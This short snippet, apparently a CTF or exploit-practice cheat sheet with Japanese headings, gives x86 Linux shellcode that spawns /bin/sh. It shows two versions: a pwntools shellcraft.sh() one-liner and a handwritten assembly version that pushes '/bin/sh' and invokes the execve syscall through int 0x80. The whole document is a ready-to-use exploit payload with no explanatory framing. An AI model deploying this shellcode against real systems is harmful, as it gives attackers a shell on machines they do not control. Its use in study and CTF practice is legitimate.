## pwntool
```python
shellcode = asm(shellcraft.sh())
```

## 手書き(短いバージョン)
```python
shellcode = asm('\n'.join([
    'push %d' % u32('/sh\0'),
    'push %d' % u32('/bin'),
    'xor edx, edx',
    'xor ecx, ecx',
    'mov ebx, esp',
    'mov eax, 0xb',
    'int 0x80',
]))
```
